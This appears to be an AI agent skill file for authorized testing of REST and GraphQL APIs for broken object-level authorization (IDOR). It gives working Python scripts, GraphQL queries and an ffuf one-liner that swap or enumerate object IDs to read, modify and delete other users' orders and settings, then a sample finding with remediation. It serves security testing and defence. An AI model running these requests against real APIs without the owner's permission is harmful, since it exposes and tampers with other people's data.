---
name: testing-api-for-broken-object-level-authorization
description: Tests REST and GraphQL APIs for Broken Object Level Authorization (BOLA/IDOR, OWASP API1:2023) by intercepting API calls, identifying object ID parameters (numeric IDs, UUIDs, slugs), and systematically substituting IDs belonging to other users to check whether the server enforces per-object authorization.
subdomain: api-security
facing: source
mitre_attack:
- T1190
- T1059.007
- T1552.001
- T1027
- T1070
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
upstream: testing-api-for-broken-object-level-authorization@54a7988 Apache-2.0, modified by wesh
---
Not for: without written authorization from the API owner. BOLA testing involves accessing or attempting to access other users' data, which requires explicit permission.

## Codegraph (do this first)
1. `codegraph_explore "authorization checks on handlers"` — locate route handlers and the authz helper; `callers` of the authz check to find handlers that skip it. Output = read.
2. Fixing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- Written authorization specifying target API endpoints and scope of testing
- At least two test accounts with different privilege levels and distinct data sets
- Burp Suite Professional or OWASP ZAP configured as intercepting proxy
- Authentication tokens (JWT, session cookies, API keys) for each test account
- API documentation (OpenAPI/Swagger spec) or access to enumerate endpoints
- Python 3.10+ with `requests` library for scripted testing
- Autorize Burp extension installed for automated BOLA detection

## Workflow

### Step 1: API Endpoint Discovery and Object ID Mapping

Enumerate all API endpoints and identify parameters that reference objects:

**From OpenAPI/Swagger Specification:**
```bash
# Download and parse the OpenAPI spec
curl -s https://target-api.example.com/api/docs/swagger.json | python3 -m json.tool
# Extract all endpoints with path parameters
curl -s https://target-api.example.com/api/docs/swagger.json | \
  python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ('get','post','put','patch','delete'):
            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
            if params:
                print(f'{method.upper()} {path} -> params: {params}')
"
```

**From Burp Suite Traffic:**
1. Browse application as User A, exercising all features that involve data creation and retrieval
2. In Burp, go to Target > Site Map and filter for API paths (e.g., `/api/v1/`, `/graphql`)
3. Look for patterns: `/api/v1/users/{id}`, `/api/v1/orders/{order_id}`, `/api/v1/documents/{doc_uuid}`
4. Note object ID format: sequential integers (predictable), UUIDs (less predictable), or encoded values

**Classify Object ID Types:**

| ID Type | Example | Predictability | BOLA Risk |
|---------|---------|---------------|-----------|
| Sequential Integer | `/orders/1042` | High - increment/decrement | Critical |
| UUID v4 | `/orders/550e8400-e29b-41d4-a716-446655440000` | Low - random | Medium (if leaked) |
| Encoded/Hashed | `/orders/base64encodedvalue` | Medium - decode and predict | High |
| Composite | `/users/42/orders/1042` | High - multiple IDs to swap | Critical |
| Slug | `/profiles/john-doe` | Medium - guess usernames | High |

### Step 2: Baseline Request Capture with Authenticated User

Capture legitimate requests for User A and User B:

```python
import requests
BASE_URL = "https://target-api.example.com/api/v1"
# User A credentials
user_a_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_a_headers = {"Authorization": user_a_token, "Content-Type": "application/json"}
# User B credentials
user_b_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/json"}
# Step 1: Identify User A's objects
user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
user_a_id = user_a_profile.json()["id"]  # e.g., 1001
user_a_orders = requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=user_a_headers)
user_a_order_ids = [o["id"] for o in user_a_orders.json()["orders"]]  # e.g., [5001, 5002]
# Step 2: Identify User B's objects
user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
user_b_id = user_b_profile.json()["id"]  # e.g., 1002
user_b_orders = requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=user_b_headers)
user_b_order_ids = [o["id"] for o in user_b_orders.json()["orders"]]  # e.g., [5003, 5004]
print(f"User A (ID: {user_a_id}): Orders {user_a_order_ids}")
print(f"User B (ID: {user_b_id}): Orders {user_b_order_ids}")
```

### Step 3: BOLA Testing - Horizontal Privilege Escalation

Attempt to access User B's objects using User A's authentication:

```python
import json
results = []
# Test 1: Access User B's profile with User A's token
resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
results.append({
    "test": "Access other user profile",
    "endpoint": f"GET /users/{user_b_id}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code == 200,
    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
})
# Test 2: Access User B's orders with User A's token
for order_id in user_b_order_ids:
    resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
    results.append({
        "test": f"Access other user order {order_id}",
        "endpoint": f"GET /orders/{order_id}",
        "auth": "User A",
        "status": resp.status_code,
        "vulnerable": resp.status_code == 200
    })
# Test 3: Modify User B's order with User A's token
resp = requests.patch(
    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
    headers=user_a_headers,
    json={"status": "cancelled"}
)
results.append({
    "test": "Modify other user order",
    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})
# Test 4: Delete User B's resource with User A's token
resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
results.append({
    "test": "Delete other user order",
    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})
# Print results
for r in results:
    status = "VULNERABLE" if r["vulnerable"] else "SECURE"
    print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
```

### Step 4: Advanced BOLA Techniques

Test for less obvious BOLA patterns:

```python
# Technique 1: Parameter pollution - send both IDs
resp = requests.get(
    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
    headers=user_a_headers
)
print(f"Parameter pollution: {resp.status_code}")
# Technique 2: JSON body object ID override
resp = requests.post(
    f"{BASE_URL}/orders/details",
    headers=user_a_headers,
    json={"order_id": user_b_order_ids[0]}
)
print(f"Body ID override: {resp.status_code}")
# Technique 3: Array of IDs - include other user's IDs in batch request
resp = requests.post(
    f"{BASE_URL}/orders/batch",
    headers=user_a_headers,
    json={"order_ids": user_a_order_ids + user_b_order_ids}
)
print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")
# Technique 4: Numeric ID manipulation for sequential IDs
for offset in range(-5, 6):
    test_id = user_a_order_ids[0] + offset
    if test_id not in user_a_order_ids:
        resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
        if resp.status_code == 200:
            owner = resp.json().get("user_id", "unknown")
            if str(owner) != str(user_a_id):
                print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")
# Technique 5: Swap object ID in nested resource paths
resp = requests.get(
    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
    headers=user_a_headers
)
print(f"Nested resource BOLA: {resp.status_code}")
# Technique 6: Method switching - GET may be blocked but PUT allowed
for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
    resp = requests.request(
        method,
        f"{BASE_URL}/users/{user_b_id}/settings",
        headers=user_a_headers,
        json={"notifications": False} if method in ('PUT', 'PATCH') else None
    )
    if resp.status_code not in (401, 403, 405):
        print(f"Method {method} on other user settings: {resp.status_code}")
```

### Step 5: Automated BOLA Detection with Autorize (Burp Suite)

Configure Autorize for automated detection:

1. Install Autorize from BApp Store in Burp Suite Professional
2. In Autorize tab, paste User B's authentication cookie or header
3. Configure interception filters:
   - Include: `.*\/api\/.*` (only API paths)
   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
4. Set enforcement detector:
   - Add conditions where response length or status code differs between User A and User B
   - Mark as "enforced" if User A gets 403/401 for User B's resources
   - Mark as "bypassed" if User A gets 200 with User B's data
5. Browse application as User A; Autorize automatically replays each request with User B's token
6. Review Autorize results table:
   - Green = Authorization enforced (secure)
   - Red = Authorization bypassed (BOLA vulnerability)
   - Orange = Needs manual review (ambiguous response)

### Step 6: GraphQL BOLA Testing

```graphql
# Test BOLA in GraphQL queries using node/ID relay pattern
# User A queries User B's order by global relay ID
query {
  node(id: "T3JkZXI6NTAwMw==") {  # Base64 of "Order:5003" (User B's)
    ... on Order {
      id
      totalAmount
      shippingAddress {
        street
        city
      }
      items {
        productName
        quantity
      }
    }
  }
}
# Test nested object access through relationships
query {
  user(id: "1002") {  # User B's ID
    email
    phoneNumber
    orders {
      edges {
        node {
          id
          totalAmount
          paymentMethod {
            lastFourDigits
          }
        }
      }
    }
  }
}
```

## Key Concepts

| Term | Definition |
|------|------------|
| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) - API does not verify that authenticated user has permission to access specific object referenced by request |
| **IDOR** | Insecure Direct Object Reference - closely related term where application uses user-controllable input to directly access objects without authorization checks |
| **Horizontal Privilege Escalation** | Accessing resources belonging to another user at same privilege level by manipulating object identifiers |
| **Vertical Privilege Escalation** | Accessing resources or functions restricted to higher privilege level (e.g., regular user accessing admin endpoints) |
| **Object ID Enumeration** | Predicting valid object identifiers by analyzing their format (sequential integers, UUID patterns, encoded values) |
| **Autorize** | A Burp Suite extension that automates authorization testing by replaying requests with different user tokens |

## Tools & Systems

- **Burp Suite Professional**: Intercepting proxy for capturing and manipulating API requests with Autorize extension for automated BOLA testing
- **OWASP ZAP**: Open-source alternative with Access Control Testing add-on for authorization boundary testing
- **Autorize**: Burp extension that automatically detects authorization enforcement by replaying requests with different user contexts
- **Postman**: API testing platform for crafting and replaying requests with different authentication tokens across collections
- **ffuf**: Web fuzzer that can enumerate object IDs at scale: `ffuf -u https://api.example.com/orders/FUZZ -w ids.txt -H "Authorization: Bearer token"`

## Finding: Broken Object Level Authorization in Order API

**ID**: API-BOLA-001
**Severity**: High (CVSS 7.5)
**OWASP API**: API1:2023 - Broken Object Level Authorization
**Affected Endpoints**:
  - GET /api/v1/orders/{id}
  - PATCH /api/v1/addresses/{id}
  - GET /api/v1/users/{id}/payment-methods
  - POST /api/v1/orders/export

**Description**:
API does not enforce object-level authorization on order retrieval,
address modification, payment method viewing, or order export endpoints.
Authenticated user can access or modify any other user's resources by
substituting object IDs in request. Sequential integer IDs make
enumeration trivial.

**Proof of Concept**:
1. Authenticate as User A (ID 1001): POST /api/v1/auth/login
2. Retrieve User A's order: GET /api/v1/orders/5001 -> 200 OK (legitimate)
3. Access User B's order: GET /api/v1/orders/5003 -> 200 OK (BOLA - returns full order details)
4. Modify User B's address: PATCH /api/v1/addresses/2002 -> 200 OK (BOLA - address changed)

**Impact**:
- Read access to all 850,000+ customer orders including shipping addresses and order contents
- Write access to any customer's delivery address, enabling package redirection
- Exposure of partial payment card data for all customers

**Remediation**:
1. Implement object-level authorization middleware that verifies authenticated user owns requested resource
2. Use authorization checks at data access layer: `WHERE order.user_id = authenticated_user.id`
3. Replace sequential integer IDs with UUIDs to reduce predictability (defense in depth, not fix alone)
4. Add authorization tests to CI/CD pipeline for every endpoint that accepts object IDs
5. Implement rate limiting per user to slow enumeration attempts
```

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/testing-api-for-broken-object-level-authorization
